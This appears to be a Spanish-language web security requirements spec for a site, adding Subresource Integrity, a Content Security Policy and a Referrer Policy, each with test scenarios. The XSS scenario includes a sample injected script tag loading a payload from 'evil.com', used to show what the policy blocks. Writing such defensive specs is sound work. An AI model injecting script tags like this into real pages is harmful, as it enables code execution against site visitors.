## ADDED Requirements

### Requirement: Subresource Integrity en todos los recursos CDN externos
Todos los `<script>` y `<link>` que cargan desde CDN externos SHALL incluir los atributos `integrity="sha384-..."` y `crossorigin="anonymous"`, de modo que el navegador rechace cualquier archivo cuyo contenido no coincida con el hash declarado.

#### Scenario: CDN externo comprometido
- **WHEN** un recurso CDN externo es reemplazado por una versión maliciosa
- **THEN** el navegador detecta que el hash SHA-384 no coincide
- **AND** bloquea la ejecución del script o la carga del estilo
- **AND** lanza un error SRI en la consola

#### Scenario: CDN sirve el archivo correcto
- **WHEN** el CDN sirve el archivo sin modificaciones
- **THEN** el hash coincide y el recurso se carga normalmente sin impacto en el usuario

---

### Requirement: Content Security Policy via meta tag
El `<head>` del documento SHALL contener una meta tag `Content-Security-Policy` que define las fuentes permitidas para scripts, estilos, fuentes, imágenes y conexiones de red, restringiendo la ejecución de código de orígenes no autorizados.

#### Scenario: Intento de inyección XSS
- **WHEN** un atacante logra inyectar `<script src="https://evil.com/payload.js">` en el DOM
- **THEN** la CSP bloquea la carga porque `evil.com` no está en la allowlist de `script-src`
- **AND** el script malicioso no se ejecuta

#### Scenario: Recursos legítimos cargando
- **WHEN** el sitio carga sus scripts y estilos normales (GSAP, Lenis, Splitting, Supabase, Cloudflare)
- **THEN** todos los recursos cargan correctamente porque sus dominios están en la allowlist

---

### Requirement: Referrer Policy meta tag
El `<head>` SHALL contener `<meta name="referrer" content="strict-origin-when-cross-origin">` para evitar que la URL completa de la página sea enviada como Referer a terceros.

#### Scenario: Usuario hace clic en enlace externo
- **WHEN** un usuario hace clic en un enlace a YouTube, Facebook, o cualquier sitio externo
- **THEN** solo se envía el origen (`https://citystream.co`) como Referer, no la URL completa ni parámetros
